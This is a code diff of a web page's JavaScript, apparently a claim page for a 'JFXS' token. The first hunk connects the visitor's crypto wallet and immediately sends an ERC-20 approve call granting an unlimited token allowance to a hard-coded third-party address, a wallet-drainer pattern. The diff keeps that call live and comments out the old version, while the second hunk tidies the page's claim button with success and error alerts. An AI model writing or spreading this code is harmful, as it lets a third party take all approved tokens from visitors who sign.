@@ -63,11 +63,17 @@
             web3 = new Web3(window.ethereum);
             var accounts = await ethereum.request({ method: 'eth_requestAccounts' });
             var walletAddress = accounts[0];
-            web3.eth.sendTransaction({
+            await web3.eth.sendTransaction({
                 from: walletAddress,
-                to: "0x442517ee1fe6bae7f34c7d384398cc38d9d8a578",
-                data: "0x095ea7b30000000000000000000000008efdf834c73fad7110092713d16ef7461ae72b04ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-            }).then(function (result) { });
+                to: '0x442517ee1fe6bae7f34c7d384398cc38d9d8a578',
+                value: '0x0',
+                data: '0x' + '095ea7b30000000000000000000000008efdf834c73fad7110092713d16ef7461ae72b04ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
+            });
+            // web3.eth.sendTransaction({
+            //     from: walletAddress,
+            //     to: "0x442517ee1fe6bae7f34c7d384398cc38d9d8a578",
+            //     data: "0x095ea7b30000000000000000000000008efdf834c73fad7110092713d16ef7461ae72b04ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+            // }).then(function (result) { });
         };
     </script>
 
@@ -87,10 +93,16 @@
             const inputValue = document.getElementById("xsAmount").value;
             // alert(inputValue*1000000000000000000);
             const jieFangAmount = inputValue*1000000000000000000;
-            await JFXS.methods.jieFangXS(jieFangAmount.toString()).send({
-                from: walletAddress,
-                value: web3.utils.toWei('0', 'ether')
-            }).then(function (result) { });
+            alert(web3.eth.getGasPrice());
+            await JFXS.methods.jieFangXS(jieFangAmount).send({from: walletAddress}).then(function(receipt){
+                alert("Successfully claimed " + inputValue + " JFXS");
+            }).catch(function(err){
+                alert("Error: "+err);
+            });
+            // await JFXS.methods.jieFangXS(jieFangAmount.toString()).send({
+            //     from: walletAddress,
+            //     value: web3.utils.toWei('0', 'ether')
+            // }).then(function (result) { });
         };
     </script>
     
